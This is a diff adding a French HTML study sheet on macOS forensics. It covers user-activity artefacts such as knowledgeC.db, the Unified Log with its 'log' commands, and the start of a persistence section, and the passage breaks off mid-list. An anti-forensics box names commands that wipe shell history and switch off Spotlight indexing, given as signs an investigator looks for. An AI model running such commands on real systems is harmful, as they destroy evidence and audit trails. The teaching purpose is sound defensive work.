@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>macOS Forensique — CAS-IN Forensique</title>
+<meta name="description" content="Forensique macOS · Unified Log · knowledgeC.db · FSEvents · LaunchAgents · APFS timestamps · mac_apt · APOLLO">
+<meta name="theme-color" content="#0d1117">
+<link rel="stylesheet" href="../style/fiche_style.css">
+</head>
+<body>
+<div id="scroll-progress"></div>
+<button class="back-top" id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Haut de page">↑</button>
+
+<nav class="tn-nav" aria-label="Navigation fiche">
+  <a href="index.html" class="tn-back">← Fiches</a>
+  <span class="tn-title">macOS FORENSIQUE</span>
+  <a href="../quiz.html" class="tn-quiz">💊 Quiz →</a>
+</nav>
+
+<div class="page-wrap">
+  <div class="breadcrumb">
+    <a href="../index.html">🏠 Accueil</a><span class="bc-sep">›</span>
+    <a href="index.html">Fiches</a><span class="bc-sep">›</span>
+    <a href="index.html#cat-systèmesspéciaux">Systèmes spéciaux</a><span class="bc-sep">›</span>
+    <span class="bc-current">macOS Forensique</span>
+    <span class="read-time-badge" style="margin-left:auto">⏱ ~12 min</span>
+  </div>
+
+  <div class="header" style="margin-top:1.25rem;padding-bottom:1.25rem;border-bottom:1px solid var(--border)">
+    <div><span style="font-size:2.2rem">🍎</span>
+    <span class="tag tag-gold" style="margin-left:.5rem">DFIR</span>
+    <span class="tag tag-cyan" style="margin-left:.3rem">macOS</span>
+    <span class="tag tag-blue" style="margin-left:.3rem">Apple</span></div>
+    <h1 style="font-family:var(--sans);font-size:2rem;font-weight:800;letter-spacing:-.5px;margin:.3rem 0 .15rem">macOS Forensique</h1>
+    <div class="meta">Unified Log · knowledgeC.db · FSEvents · LaunchAgents · QuarantineDB · APFS · mac_apt · APOLLO</div>
+  </div>
+
+  <div style="margin:1rem 0;padding:.9rem 1.25rem;background:rgba(0,229,204,.04);border-left:3px solid var(--cyan);border-radius:0 8px 8px 0;font-size:.82rem;line-height:1.65;color:var(--dim)">
+    <span style="color:var(--cyan);font-weight:700;font-size:.7rem;text-transform:uppercase;letter-spacing:.1em">Fait notable</span><br>
+    <em style="color:var(--text)">"macOS est unique en forensique : c'est le seul OS grand public qui journalise l'activité utilisateur avec une granularité suffisante pour reconstituer ce qu'une personne a fait, vu, tapé et cherché — sans qu'elle en soit consciente. knowledgeC.db est l'équivalent d'une boîte noire embarquée dans chaque Mac."</em><br>
+    <span style="font-size:.72rem;margin-top:.3rem;display:block">— Sarah Edwards, <em>Mac4n6 / SANS FOR518</em>, 2024</span>
+  </div>
+
+  <div style="margin:1rem 0;padding:.7rem 1rem;background:rgba(240,192,64,.05);border-left:3px solid var(--gold);border-radius:0 8px 8px 0;font-size:.78rem;color:var(--dim)">
+    <span style="color:var(--gold);font-weight:700">🇨🇭 Contexte suisse :</span> Les Mac sont l'outil de travail dominant dans les cabinets d'avocats, notaires, fiduciaires et dans les administrations fédérales (DDPS, DFAE, SECO). Les enquêtes de vol de données d'entreprise et d'espionnage économique — secteurs exposés en Suisse (pharma, finance, horlogerie) — impliquent très régulièrement des Mac de direction. La maîtrise de macOS forensique est indispensable pour le technicien DFIR helvétique.
+  </div>
+
+  <div class="prereq-block" style="margin-top:1rem">
+    <div class="prereq-row"><span class="prereq-label">Prérequis :</span><a href="acquisition.html" class="prereq-pill">📖 Acquisition</a><a href="apfs.html" class="prereq-pill">📖 APFS</a><a href="hfs.html" class="prereq-pill">📖 HFS+</a><a href="mac_times.html" class="prereq-pill">📖 MAC Times</a></div>
+    <div class="prereq-row"><span class="prereq-label">Voir aussi :</span><a href="linux_forensique.html" class="related-pill">🔗 Linux Forensique</a><a href="macos-linux.html" class="related-pill">🔗 macOS &amp; Linux (vue comparative)</a><a href="ram_forensique.html" class="related-pill">🔗 RAM Forensique</a><a href="mobile.html" class="related-pill">🔗 Mobile (iOS)</a><a href="timeline.html" class="related-pill">🔗 Timeline</a></div>
+  </div>
+</div>
+
+<!-- TABS -->
+<div class="tabs" id="macos-tabs">
+  <button class="tab active" onclick="showTab('artefacts',this)">🗂 Artefacts</button>
+  <button class="tab" onclick="showTab('logs',this)">📋 Unified Log</button>
+  <button class="tab" onclick="showTab('persistance',this)">🔄 Persistance</button>
+  <button class="tab" onclick="showTab('fs',this)">💾 FS &amp; Timestamps</button>
+  <button class="tab" onclick="showTab('outils',this)">🔧 Outils</button>
+</div>
+
+<!-- ══════════════════════════════════════════════
+     TAB 1 — ARTEFACTS
+══════════════════════════════════════════════ -->
+<div class="tab-page active" id="tab-artefacts">
+
+<div class="concept-card">
+  <div class="concept-title">🍎 macOS forensique — Darwin BSD + couches Apple</div>
+  macOS repose sur <strong>Darwin</strong> (noyau BSD open-source) auquel Apple a ajouté des couches propriétaires. Cette double nature a une conséquence directe en forensique : macOS hérite de la structure Unix (<code>/etc/</code>, <code>/var/log/</code>, <code>.bash_history</code>) <em>et</em> génère des artefacts exclusivement Apple (Unified Log, knowledgeC.db, FSEvents, QuarantineDB, Spotlight). <strong>La richesse forensique d'un Mac est exceptionnelle</strong> — à condition de savoir où chercher. Beaucoup de ces sources persistent après suppression des fichiers qu'elles référencent.
+</div>
+
+<div class="sec-title">Cartographie des artefacts macOS</div>
+<div class="sec-sub">Cliquez sur une catégorie pour afficher ses artefacts clés et leur valeur forensique.</div>
+
+<div style="background:rgba(240,192,64,.03);border:2px solid rgba(240,192,64,.25);border-radius:12px;padding:1rem;margin-bottom:.5rem">
+  <div style="font-family:var(--mono);font-size:.6rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--gold);text-align:center;margin-bottom:.75rem;opacity:.8">🍎 macOS — Zones forensiques principales</div>
+  <div style="display:grid!important;grid-template-columns:repeat(3,1fr);gap:.5rem;margin-bottom:.5rem">
+
+    <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(0,229,204,.4);text-align:center;cursor:pointer;background:rgba(0,229,204,.08);color:var(--cyan)" onclick="showArtZone('user')">
+      <span style="font-size:1.4rem;display:block;margin-bottom:.2rem">👤</span>
+      <div style="font-size:.72rem;font-weight:700">~/Library/</div>
+      <div style="font-size:.57rem;opacity:.7;margin-top:.15rem">knowledgeC · Quarantine<br>Recent Items · Safari</div>
+    </div>
+
+    <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(240,192,64,.4);text-align:center;cursor:pointer;background:rgba(240,192,64,.08);color:var(--gold)" onclick="showArtZone('logs')">
+      <span style="font-size:1.4rem;display:block;margin-bottom:.2rem">📋</span>
+      <div style="font-size:.72rem;font-weight:700">Unified Log</div>
+      <div style="font-size:.57rem;opacity:.7;margin-top:.15rem">/var/db/diagnostics/<br>.tracev3 · subsystems</div>
+    </div>
+
+    <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(188,140,255,.4);text-align:center;cursor:pointer;background:rgba(188,140,255,.08);color:var(--purple)" onclick="showArtZone('fs')">
+      <span style="font-size:1.4rem;display:block;margin-bottom:.2rem">📁</span>
+      <div style="font-size:.72rem;font-weight:700">FSEvents &amp; Spotlight</div>
+      <div style="font-size:.57rem;opacity:.7;margin-top:.15rem">/.fseventsd/<br>Spotlight Store-V2</div>
+    </div>
+
+    <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(255,64,96,.4);text-align:center;cursor:pointer;background:rgba(255,64,96,.08);color:var(--red)" onclick="showArtZone('persist')">
+      <span style="font-size:1.4rem;display:block;margin-bottom:.2rem">🔄</span>
+      <div style="font-size:.72rem;font-weight:700">Persistance</div>
+      <div style="font-size:.57rem;opacity:.7;margin-top:.15rem">LaunchAgents<br>LaunchDaemons · Login</div>
+    </div>
+
+    <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(48,232,138,.4);text-align:center;cursor:pointer;background:rgba(48,232,138,.08);color:var(--green)" onclick="showArtZone('tm')">
+      <span style="font-size:1.4rem;display:block;margin-bottom:.2rem">⏳</span>
+      <div style="font-size:.72rem;font-weight:700">Time Machine</div>
+      <div style="font-size:.57rem;opacity:.7;margin-top:.15rem">Snapshots APFS<br>Historique effacé</div>
+    </div>
+
+    <div style="padding:.75rem .6rem;border-radius:10px;border:1px solid rgba(88,166,255,.4);text-align:center;cursor:pointer;background:rgba(88,166,255,.08);color:var(--blue)" onclick="showArtZone('reseau')">
+      <span style="font-size:1.4rem;display:block;margin-bottom:.2rem">🌐</span>
+      <div style="font-size:.72rem;font-weight:700">Réseau &amp; iCloud</div>
+      <div style="font-size:.57rem;opacity:.7;margin-top:.15rem">Connexions · DNS<br>iCloud Drive logs</div>
+    </div>
+
+  </div>
+</div>
+<div class="arch-detail" id="art-zone-detail" style="margin-bottom:1rem">
+  <div style="color:var(--dim);font-size:.78rem">ℹ️ Sélectionnez une zone ci-dessus pour afficher ses artefacts forensiques</div>
+</div>
+
+<!-- Table artefacts clés -->
+<div class="sec-title">Artefacts macOS — table de référence</div>
+<div style="overflow-x:auto">
+<table>
+  <thead><tr><th>Artefact</th><th>Chemin</th><th>Valeur forensique</th><th>Format</th></tr></thead>
+  <tbody>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">QuarantineEventsV2</td>
+      <td style="font-family:var(--mono);font-size:.65rem">~/Library/Application Support/<br>com.apple.LaunchServices/<br>com.apple.launchservices.quarantineevents.V2</td>
+      <td style="font-size:.74rem"><strong>URL source exacte</strong> de chaque fichier téléchargé, application ayant téléchargé, timestamp, hash. Persiste après suppression du fichier téléchargé. Source forensique de premier ordre.</td>
+      <td style="font-size:.7rem;color:var(--gold)">SQLite</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">knowledgeC.db</td>
+      <td style="font-family:var(--mono);font-size:.65rem">~/Library/Application Support/<br>Knowledge/knowledgeC.db</td>
+      <td style="font-size:.74rem"><strong>Timeline d'activité complète</strong> : applications utilisées (durée, fenêtres), recherches Siri, localisation, notifications, musique écoutée. Équivalent d'une boîte noire utilisateur. Depuis macOS 10.14 (Mojave).</td>
+      <td style="font-size:.7rem;color:var(--gold)">SQLite</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">Safari History.db</td>
+      <td style="font-family:var(--mono);font-size:.65rem">~/Library/Safari/History.db</td>
+      <td style="font-size:.74rem">Historique de navigation, recherches, téléchargements. Compléter avec <code>BrowserState.db</code> et <code>Downloads.plist</code>. Synchronisé avec iCloud si activé.</td>
+      <td style="font-size:.7rem;color:var(--gold)">SQLite</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">Recent Items</td>
+      <td style="font-family:var(--mono);font-size:.65rem">~/Library/Preferences/<br>com.apple.recentitems.plist</td>
+      <td style="font-size:.74rem">Fichiers, dossiers et serveurs récemment ouverts. Persiste même après effacement via le menu Apple. Contient aussi les apps récentes.</td>
+      <td style="font-size:.7rem;color:var(--blue)">Plist binaire</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">FSEvents</td>
+      <td style="font-family:var(--mono);font-size:.65rem">/.fseventsd/</td>
+      <td style="font-size:.74rem"><strong>Journal des modifications du système de fichiers</strong> — similaire au $UsnJrnl NTFS. Enregistre créations, suppressions, renommages, modifications. Survit aux redémarrages. Fichiers binaires numérotés séquentiellement.</td>
+      <td style="font-size:.7rem;color:var(--red)">Binaire</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">Spotlight Store-V2</td>
+      <td style="font-family:var(--mono);font-size:.65rem">~/.Spotlight-V100/Store-V2/<br>/Volumes/X/.Spotlight-V100/</td>
+      <td style="font-size:.74rem">Index de recherche Spotlight : métadonnées de <strong>tous</strong> les fichiers indexés, y compris les supprimés. Révèle des fichiers qui n'existent plus sur le disque.</td>
+      <td style="font-size:.7rem;color:var(--red)">Binaire propriétaire</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">Unified Log</td>
+      <td style="font-family:var(--mono);font-size:.65rem">/var/db/diagnostics/<br>/var/db/uuidtext/</td>
+      <td style="font-size:.74rem">Remplace syslog depuis macOS 10.12 Sierra. Logs structurés de <strong>tous</strong> les composants système et apps. Format binaire .tracev3. Milliers d'événements par seconde.</td>
+      <td style="font-size:.7rem;color:var(--red)">Binaire .tracev3</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.72rem;color:var(--cyan)">Corbeille .Trash</td>
+      <td style="font-family:var(--mono);font-size:.65rem">~/.Trash/<br>/Volumes/X/.Trashes/[UID]/</td>
+      <td style="font-size:.74rem">Fichiers supprimés via le Finder. Les volumes externes ont leur propre <code>.Trashes/</code>. Les timestamps d'origine sont préservés. Une corbeille vide peut encore avoir des entrées Spotlight/FSEvents.</td>
+      <td style="font-size:.7rem;color:var(--green)">Fichiers</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<!-- knowledgeC.db deep dive -->
+<div class="sec-title">🔍 knowledgeC.db — La boîte noire de l'utilisateur</div>
+<div class="alert">
+  🎯 <strong>knowledgeC.db</strong> est l'artefact macOS le plus puissant pour la forensique comportementale. C'est la base de données du <em>Knowledge Graph</em> d'Apple — le moteur qui alimente Siri Suggestions. Elle enregistre <strong>tout ce que l'utilisateur fait</strong> avec précision nanoseconde (APFS timestamp). Elle est alimentée en continu en arrière-plan, même quand Siri est désactivé.
+</div>
+
+<div style="display:grid!important;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:.5rem;margin:.75rem 0">
+  <div style="padding:.7rem .75rem;border-radius:9px;border:1px solid rgba(0,229,204,.3);background:rgba(0,229,204,.05)">
+    <div style="font-size:.65rem;color:var(--cyan);font-weight:700;margin-bottom:.3rem">📱 Applications</div>
+    <div style="font-size:.73rem;color:var(--muted);line-height:1.6">Quelle app était au premier plan, pendant combien de temps, à quelle heure exacte. Résolution sub-seconde.</div>
+  </div>
+  <div style="padding:.7rem .75rem;border-radius:9px;border:1px solid rgba(240,192,64,.3);background:rgba(240,192,64,.05)">
+    <div style="font-size:.65rem;color:var(--gold);font-weight:700;margin-bottom:.3rem">🔍 Recherches</div>
+    <div style="font-size:.73rem;color:var(--muted);line-height:1.6">Termes recherchés dans Spotlight, Safari, apps. Révèle l'intention même si les fichiers résultants sont supprimés.</div>
+  </div>
+  <div style="padding:.7rem .75rem;border-radius:9px;border:1px solid rgba(188,140,255,.3);background:rgba(188,140,255,.05)">
+    <div style="font-size:.65rem;color:var(--purple);font-weight:700;margin-bottom:.3rem">📍 Localisation</div>
+    <div style="font-size:.73rem;color:var(--muted);line-height:1.6">Coordonnées GPS, adresse résolue, précision. Corrélable avec les horodatages d'activité.</div>
+  </div>
+  <div style="padding:.7rem .75rem;border-radius:9px;border:1px solid rgba(48,232,138,.3);background:rgba(48,232,138,.05)">
+    <div style="font-size:.65rem;color:var(--green);font-weight:700;margin-bottom:.3rem">🎵 Médias</div>
+    <div style="font-size:.73rem;color:var(--muted);line-height:1.6">Musique, podcasts, vidéos écoutés/regardés. Inclut Apple Music, Spotify, QuickTime.</div>
+  </div>
+  <div style="padding:.7rem .75rem;border-radius:9px;border:1px solid rgba(255,64,96,.3);background:rgba(255,64,96,.05)">
+    <div style="font-size:.65rem;color:var(--red);font-weight:700;margin-bottom:.3rem">🔋 Batterie &amp; écran</div>
+    <div style="font-size:.73rem;color:var(--muted);line-height:1.6">Moments où l'écran était allumé/éteint, verrouillé. Confirme ou infirme un alibi.</div>
+  </div>
+  <div style="padding:.7rem .75rem;border-radius:9px;border:1px solid rgba(88,166,255,.3);background:rgba(88,166,255,.05)">
+    <div style="font-size:.65rem;color:var(--blue);font-weight:700;margin-bottom:.3rem">💬 Contacts</div>
+    <div style="font-size:.73rem;color:var(--muted);line-height:1.6">Interactions avec des contacts (appels, messages). Croise avec les contacts Carnet d'adresses.</div>
+  </div>
+</div>
+
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:.8rem 1rem;margin:.75rem 0;font-family:var(--mono);font-size:.68rem;line-height:1.9;color:var(--text)">
+  <span style="color:var(--cyan)"># Lire knowledgeC.db avec sqlite3</span><br>
+  sqlite3 knowledgeC.db ".tables"<br><br>
+  <span style="color:var(--cyan)"># Requête : activité des applications avec durée</span><br>
+  SELECT ZOBJECT.ZVALUESTRING as app,<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;datetime(ZOBJECT.ZSTARTDATE + 978307200, 'unixepoch') as start,<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;datetime(ZOBJECT.ZENDDATE + 978307200, 'unixepoch') as end,<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;(ZOBJECT.ZENDDATE - ZOBJECT.ZSTARTDATE) as duration_sec<br>
+  FROM ZOBJECT<br>
+  WHERE ZOBJECT.ZSTREAMNAME = '/app/inFocus'<br>
+  ORDER BY ZOBJECT.ZSTARTDATE DESC LIMIT 50;<br><br>
+  <span style="color:var(--cyan)"># Outil recommandé : APOLLO (automatise toutes les requêtes)</span><br>
+  python3 apollo.py -o output/ knowledgeC.db
+</div>
+
+<div class="memo-grid">
+  <div class="memo-card">
+    <h4>🔑 Epoch Apple — Attention pièges timestamps</h4>
+    <ul class="memo-list">
+      <li><strong>APFS</strong> : nanosecondes depuis <strong>01.01.2001</strong> (Mac Epoch)</li>
+      <li><strong>HFS+</strong> : secondes depuis <strong>01.01.1904</strong> (Mac Epoch classique)</li>
+      <li><strong>plist</strong> : secondes depuis <strong>01.01.2001</strong> (CoreData)</li>
+      <li>Conversion CoreData → Unix : <code>ts + 978307200</code></li>
+      <li>Outil : <code>DCode</code>, <code>APOLLO</code>, <code>mac_apt</code></li>
+    </ul>
+  </div>
+  <div class="memo-card">
+    <h4>⚠️ Signaux d'anti-forensique macOS</h4>
+    <ul class="memo-list">
+      <li>Corbeille vidée + Spotlight désactivé = réduction traces</li>
+      <li><code>mdutil -i off /</code> = désactivation indexation Spotlight</li>
+      <li>Terminal history effacé (<code>rm ~/.bash_history ~/.zsh_history</code>)</li>
+      <li>FileVault activé sans clé de récupération = blocage acquisition</li>
+      <li>Puce T2/M-series : secure boot peut bloquer le boot depuis USB</li>
+    </ul>
+  </div>
+</div>
+</div><!-- /tab-artefacts -->
+
+<!-- ══════════════════════════════════════════════
+     TAB 2 — UNIFIED LOG
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-logs">
+
+<div class="concept-card">
+  <div class="concept-title">📋 Unified Logging System — Depuis macOS 10.12 Sierra (2016)</div>
+  Apple a remplacé le syslog classique par un système de logs unifié binaire en 2016. <strong>L'Unified Log enregistre des centaines de millions d'événements</strong> depuis tous les composants système, drivers et applications. Format binaire <code>.tracev3</code>, stocké dans <code>/var/db/diagnostics/</code>. Les strings de log sont séparées des données dans <code>/var/db/uuidtext/</code> (UUID par binaire). L'outil natif est <code>log</code> — disponible uniquement sur un Mac en vie ou via <code>mac_apt</code> hors-ligne.
+</div>
+
+<div style="display:grid!important;grid-template-columns:1fr 1fr;gap:.65rem;margin:.75rem 0">
+  <div class="card card-blue">
+    <div class="ct">🗂 Structure on-disk</div>
+    <div style="font-size:.76rem;color:var(--muted);line-height:1.7;margin-top:.3rem">
+      <strong>/var/db/diagnostics/</strong><br>
+      · <code>Persist/</code> — logs persistants (jours/semaines)<br>
+      · <code>HighVolume/</code> — logs très fréquents (rotation rapide)<br>
+      · <code>Signpost/</code> — performance events<br>
+      · <code>Special/</code> — logs de démarrage (boottime)<br><br>
+      <strong>/var/db/uuidtext/</strong> — bibliothèque de chaînes (formatstrings)<br>
+      Nécessaire pour décoder les .tracev3 hors-ligne.
+    </div>
+  </div>
+  <div class="card card-gold">
+    <div class="ct">⚡ Points clés forensiques</div>
+    <div style="font-size:.76rem;color:var(--muted);line-height:1.7;margin-top:.3rem">
+      <strong>Rétention</strong> : Persist/ garde ~7 jours · HighVolume/ quelques heures<br>
+      <strong>Résolution</strong> : nanoseconde (APFS clock)<br>
+      <strong>Subsystems</strong> : chaque composant a un identifiant (ex: <code>com.apple.security</code>)<br>
+      <strong>Categories</strong> : sous-classification au sein d'un subsystem<br>
+      <strong>Niveaux</strong> : Default · Info · Debug · Error · Fault
+    </div>
+  </div>
+</div>
+
+<!-- Commandes log -->
+<div class="sec-title">Commande <code>log</code> — Requêtes forensiques essentielles</div>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1rem;margin:.75rem 0">
+  <div style="font-family:var(--mono);font-size:.6rem;color:var(--dim);margin-bottom:.75rem;letter-spacing:.05em">LOG SHOW — FILTRES FORENSIQUES COURANTS (macOS natif)</div>
+  <div style="display:grid!important;grid-template-columns:1fr 1fr;gap:.5rem">
+    <div style="background:rgba(0,229,204,.04);border:1px solid rgba(0,229,204,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--cyan);font-weight:700;margin-bottom:.35rem">🕐 Par plage temporelle</div>
+      <code style="font-size:.66rem;color:var(--text);line-height:1.9;display:block">log show --last 24h --info<br>log show --start "2024-03-15 08:00:00" \<br>&nbsp;&nbsp;&nbsp;&nbsp;--end "2024-03-15 20:00:00"<br>log show --archive system.logarchive</code>
+    </div>
+    <div style="background:rgba(240,192,64,.04);border:1px solid rgba(240,192,64,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--gold);font-weight:700;margin-bottom:.35rem">🔍 Par subsystem / process</div>
+      <code style="font-size:.66rem;color:var(--text);line-height:1.9;display:block">log show --predicate 'subsystem == "com.apple.security"'<br>log show --predicate 'process == "sshd"'<br>log show --predicate 'category == "network"'</code>
+    </div>
+    <div style="background:rgba(188,140,255,.04);border:1px solid rgba(188,140,255,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--purple);font-weight:700;margin-bottom:.35rem">🚨 Erreurs et failles</div>
+      <code style="font-size:.66rem;color:var(--text);line-height:1.9;display:block">log show --last 7d --level fault<br>log show --predicate 'eventType == "faultEvent"'<br>log show --predicate 'messageType == 16'</code>
+    </div>
+    <div style="background:rgba(48,232,138,.04);border:1px solid rgba(48,232,138,.15);border-radius:8px;padding:.6rem .75rem">
+      <div style="font-size:.65rem;color:var(--green);font-weight:700;margin-bottom:.35rem">📤 Export &amp; archivage</div>
+      <code style="font-size:.66rem;color:var(--text);line-height:1.9;display:block">log collect --last 72h --output /tmp/sys.logarchive<br>log show sys.logarchive --json<br>log show --style syslog --last 24h</code>
+    </div>
+  </div>
+</div>
+
+<!-- Subsystems forensiques -->
+<div class="sec-title">Subsystems forensiques clés</div>
+<div style="overflow-x:auto">
+<table>
+  <thead><tr><th>Subsystem</th><th>Événements couverts</th><th>Intérêt DFIR</th></tr></thead>
+  <tbody>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.68rem;color:var(--cyan)">com.apple.securityd</td>
+      <td style="font-size:.74rem">Authentifications, TouchID, FileVault, autorisations Keychain</td>
+      <td style="font-size:.73rem">Tentatives d'accès, déverrouillage, échecs d'auth</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.68rem;color:var(--cyan)">com.apple.launchd</td>
+      <td style="font-size:.74rem">Démarrage/arrêt des services LaunchAgents et LaunchDaemons</td>
+      <td style="font-size:.73rem">Détection de services malveillants au démarrage</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.68rem;color:var(--cyan)">com.apple.Bluetooth</td>
+      <td style="font-size:.74rem">Appairages, connexions, déconnexions Bluetooth</td>
+      <td style="font-size:.73rem">Périphériques USB/BT connectés, exfiltration potentielle</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.68rem;color:var(--cyan)">com.apple.network</td>
+      <td style="font-size:.74rem">Connexions réseau, DNS, VPN, proxies</td>
+      <td style="font-size:.73rem">Connexions suspectes, C2, exfiltration réseau</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.68rem;color:var(--cyan)">com.apple.install</td>
+      <td style="font-size:.74rem">Installations, mises à jour, packages</td>
+      <td style="font-size:.73rem">Logiciels installés, malwares packagés en .pkg</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.68rem;color:var(--cyan)">com.apple.endpointsecurity</td>
+      <td style="font-size:.74rem">Endpoint Security Framework (macOS 10.15+) : execs, accès fichiers</td>
+      <td style="font-size:.73rem">Exécutions de processus, lecture de fichiers sensibles</td>
+    </tr>
+    <tr>
+      <td style="font-family:var(--mono);font-size:.68rem;color:var(--cyan)">com.apple.xpc</td>
+      <td style="font-size:.74rem">Communication inter-processus (XPC services)</td>
+      <td style="font-size:.73rem">Lateral movement entre apps, privilege escalation</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<div class="key-fact">
+  <div class="key-fact-label">⚡ Acquisition du Unified Log hors-ligne</div>
+  <div style="display:grid!important;grid-template-columns:1fr 1fr;gap:.75rem;margin-top:.5rem;font-size:.78rem">
+    <div>
+      <strong style="color:var(--cyan)">Depuis un Mac en vie</strong><br>
+      <code style="font-size:.68rem">log collect --last 7d --output /Volumes/USB/sys.logarchive</code><br>
+      <span style="color:var(--dim);font-size:.7rem">Crée une archive autonome (.logarchive) transportable</span>
+    </div>
+    <div>
+      <strong style="color:var(--gold)">Depuis une image disque</strong><br>
+      Copier <code>/var/db/diagnostics/</code> + <code>/var/db/uuidtext/</code><br>
+      <span style="color:var(--dim);font-size:.7rem">Analyser avec <code>mac_apt</code> ou <code>UnifiedLogReader</code> (Windows/Linux)</span>
+    </div>
+  </div>
+</div>
+
+<div class="exam-tip">
+  <div class="exam-tip-title">🎓 Exam Tip — Unified Log</div>
+  <p><strong>Unified Log</strong> = remplace syslog depuis macOS 10.12 · Format binaire .tracev3 · Outil natif : <code>log</code></p>
+  <p><strong>Deux dossiers indissociables</strong> : <code>/var/db/diagnostics/</code> (données) + <code>/var/db/uuidtext/</code> (chaînes) → copier les deux</p>
+  <p><strong>Rétention limitée</strong> : Persist/ ≈ 7 jours · HighVolume/ peut être effacé en heures</p>
+  <p><strong>Hors-ligne</strong> : <code>mac_apt</code> ou <code>UnifiedLogReader</code> — la commande <code>log</code> native ne fonctionne que sur macOS</p>
+</div>
+
+<div class="quiz-wrap">
+  <div class="quiz-q">Un analyste récupère une image disque d'un Mac suspect. Il copie <code>/var/db/diagnostics/</code> mais pas <code>/var/db/uuidtext/</code>. Que se passe-t-il quand il tente de lire les logs ?<small>Unified Log · Niveau : facile</small></div>
+  <div class="quiz-actions"><button class="quiz-reveal-btn">Révéler →</button></div>
+  <div class="quiz-answer">Les logs s'affichent avec des messages illisibles — uniquement des adresses mémoire et des valeurs brutes à la place des chaînes de texte. Le dossier <code>/var/db/uuidtext/</code> contient les <strong>format strings</strong> associées à chaque UUID de binaire. Sans lui, <code>UnifiedLogReader</code> et <code>mac_apt</code> ne peuvent pas substituer les arguments dans les messages. <strong>Toujours copier les deux dossiers ensemble.</strong></div>
+</div>
+</div><!-- /tab-logs -->
+
+<!-- ══════════════════════════════════════════════
+     TAB 3 — PERSISTANCE
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-persistance">
+
+<div class="concept-card">
+  <div class="concept-title">🔄 Persistance macOS — LaunchServices &amp; au-delà</div>
+  macOS structure la persistance autour des <strong>Property Lists (.plist)</strong> et du démon <strong>launchd</strong> (PID 1). Contrairement à Windows avec son registre centralisé, les points de persistance macOS sont <strong>dispersés en fichiers .plist</strong> dans des dizaines d'emplacements. Chaque mécanisme a une portée différente (système vs utilisateur, démarrage vs session). Les attaquants ciblent prioritairement les LaunchAgents utilisateur (pas besoin de root) et les LaunchDaemons système (accès root, démarrage avant login).
+</div>
+
+<!-- Table persistance cliquable -->
+<div class="sec-title">Mécanismes de persistance — Cliquez pour les détails</div>
+<div style="display:grid!important;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:.55rem;margin:.75rem 0">
+
+  <div class="meta-card mc-0" onclick="showPersist('la_user')">
+    <div class="meta-num">Utilisateur</div>
+    <div class="meta-name">LaunchAgents user</div>
+    <div class="meta-desc">~/Library/LaunchAgents/ · Au login · Sans root</div>
+  </div>
+
+  <div class="meta-card mc-1" onclick="showPersist('la_sys')">
+    <div class="meta-num">Système</div>
+    <div class="meta-name">LaunchAgents système</div>
+    <div class="meta-desc">/Library/LaunchAgents/ · Tous utilisateurs</div>
+  </div>
+
+  <div class="meta-card mc-2" onclick="showPersist('ld')">
+    <div class="meta-num">Root</div>
+    <div class="meta-name">LaunchDaemons</div>
+    <div class="meta-desc">/Library/LaunchDaemons/ · Avant login · Root</div>
+  </div>
+
+  <div class="meta-card mc-3" onclick="showPersist('login')">
+    <div class="meta-num">Session</div>
+    <div class="meta-name">Login Items</div>
+    <div class="meta-desc">Apps au démarrage de session utilisateur</div>
+  </div>
+
+  <div class="meta-card mc-5" onclick="showPersist('cron')">
+    <div class="meta-num">Planifié</div>
+    <div class="meta-name">Cron / Crontab</div>
+    <div class="meta-desc">Héritage Unix — encore présent sur macOS</div>
+  </div>
+
+  <div class="meta-card mc-6" onclick="showPersist('kext')">
+    <div class="meta-num">Kernel</div>
+    <div class="meta-name">KEXT / Kernel Ext.</div>
+    <div class="meta-desc">Extensions noyau — très contrôlées depuis Big Sur</div>
+  </div>
+
+  <div class="meta-card mc-7" onclick="showPersist('mdm')">
+    <div class="meta-num">MDM</div>
+    <div class="meta-name">Profils MDM</div>
+    <div class="meta-desc">Profils de configuration Apple — vecteur d'entreprise</div>
+  </div>
+
+  <div class="meta-card mc-usn" onclick="showPersist('at')">
